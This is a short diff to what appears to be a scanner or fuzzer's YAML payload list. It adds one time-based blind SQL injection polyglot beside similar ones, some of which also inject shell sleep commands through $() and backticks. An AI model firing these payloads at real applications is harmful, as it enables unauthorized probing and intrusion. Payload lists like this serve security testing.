@@ -115,6 +115,8 @@ payloads:
   - >-
     /**/ AND if(now()=sysdate(),sleep(240),0)/*'XOR(if(now()=sysdate(),sleep(240),0))OR'\"XOR(if(now()=sysdate(),sleep(240),0))OR\"*/
   - >-
+    if(now()=sysdate(),sleep(240),0)/*'XOR(if(now()=sysdate(),sleep(240),0))OR'\"XOR(if(now()=sysdate(),sleep(240),0))OR\"*/
+  - >-
     'if(now()=sysdate(),sleep(240),0)/*'XOR(if(now()=sysdate(),sleep(240),0))OR'\"XOR(if(now()=sysdate(),sleep(240),0))OR\"*/
   - >-
     /**/ AND /*$(sleep 240)`sleep 240``*/-sleep(240)#'/*$(sleep 240)`sleep 240` #*/||sleep(240)||'\"||sleep(240)||\"`
